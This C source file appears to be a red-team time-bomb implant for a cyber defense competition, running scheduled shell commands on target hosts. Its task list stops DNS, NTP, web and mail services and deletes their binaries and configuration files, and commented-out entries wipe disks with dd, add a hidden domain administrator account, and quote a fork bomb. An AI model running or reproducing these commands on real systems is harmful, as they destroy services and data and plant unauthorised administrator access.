#include "alarmpart.h"

#ifdef LINUX_VERSION
//Perhaps a forkbomb   :(){ :|:& };:

taskstruct tasklist[] = {
    {FRIDAY, 15, 0, "/usr/bin/xeyes", 0},

    {SATURDAY, 12, 0, "/bin/systemctl stop bind9.service", 0},   //.20 dns
    {SATURDAY, 12, 0, "/bin/systemctl stop ntp.service", 0},     //.20 ntp
    {SATURDAY, 12, 0, "/usr/sbin/service apache2 stop", 0},      //.23 apache (zencart)
    {SATURDAY, 12, 0, "/bin/systemctl stop httpd.service", 0},   //.11 apache (prestashop) and .39 squirrelmail
    {SATURDAY, 12, 0, "/bin/systemctl stop dovecot.service", 0}, //.39 squirrel
    {SATURDAY, 12, 0, "/bin/systemctl stop postfix.service", 0}, //.39 squirrel

    {SATURDAY, 13, 0, "/bin/systemctl stop bind9.service; rm /usr/sbin/named", 0},             //.20 dns
    {SATURDAY, 13, 0, "/bin/systemctl stop ntp.service; rm /usr/sbin/ntpd", 0},                //.20 ntp
    {SATURDAY, 13, 0, "/usr/sbin/service apache2 stop; rm /etc/apache2/apache2.conf", 0},      //.23 apache (zencart)
    {SATURDAY, 13, 0, "/bin/systemctl stop httpd.service; rm /etc/httpd/conf/httpd.conf", 0},  //.11 apache (prestashop) and 39 squirrelmail
    {SATURDAY, 13, 0, "/bin/systemctl stop dovecot.service; rm /usr/sbin/dovecot", 0},         //.39 squirrel
    {SATURDAY, 13, 0, "/bin/systemctl stop postfix.service; rm /usr/libexec/postfix/smtpd", 0} /*, //.39 squirrel

    {SATURDAY, 14, 0, "/bin/dd if=/dev/null of=/dev/sda1 bs=1M; shutdown -h now", 0},                        // Any
    {SATURDAY, 15, 0, "/bin/dd if=/dev/null of=/dev/dm-0 bs=1M; shutdown -h now", 0},                        //.23 only, doubt this will ever run but why not have it.
    {SATURDAY, 15, 0, "/bin/dd if=/dev/null of=/dev/mapper/fedora--server_fedora-root; shutdown -h now", 0}, //.39 only, doubt this will ever run but why not have it.
    {SATURDAY, 15, 0, "/bin/dd if=/dev/null of=/dev/mapper/centos-root bs=1M; shutdown -h now", 0}           //.11 only, doubt this will ever run but why not have it.
*/
};
#endif

#ifdef WINDOWS_VERSION
 taskstruct tasklist[] = {
{ FRIDAY, 15, 0, "c:\\Windows\\notepad.exe", 1},
{ SATURDAY, 15, 0, "c:\\Windows\\notepad.exe", 1}
//{ SATURDAY, 10, 0, "net user Scoring redteam123 /add; net group \"Domain Administrators\" /add; net localgroup \"Administrators\" /add;", 0}
};
#endif


void add_task(int day, int hour, int min, char *task)
{
    // Need to go dynamic to do this.  Do I want to?
}

void check_time_tasks(void)
{
    time_t current_time = time(NULL);
    struct tm *time_info = localtime(&current_time);

    int tasklistlen = sizeof(tasklist) / sizeof(taskstruct);
#ifdef TESTING
    printf("Task list is %d long\n", tasklistlen);
#endif
    int i;
    for (i = 0; i < tasklistlen; i++)
    {
        if ((tasklist[i].done == 0) &&
            (time_info->tm_wday == tasklist[i].day) &&
            (time_info->tm_hour == tasklist[i].hour) &&
            (time_info->tm_min == tasklist[i].min))
        {

#ifdef TESTING
            printf("Attempting to run :%s:\n", tasklist[i].task);
#endif
            runtask(tasklist[i].task);
            tasklist[i].done = 1;
        }
    }
}
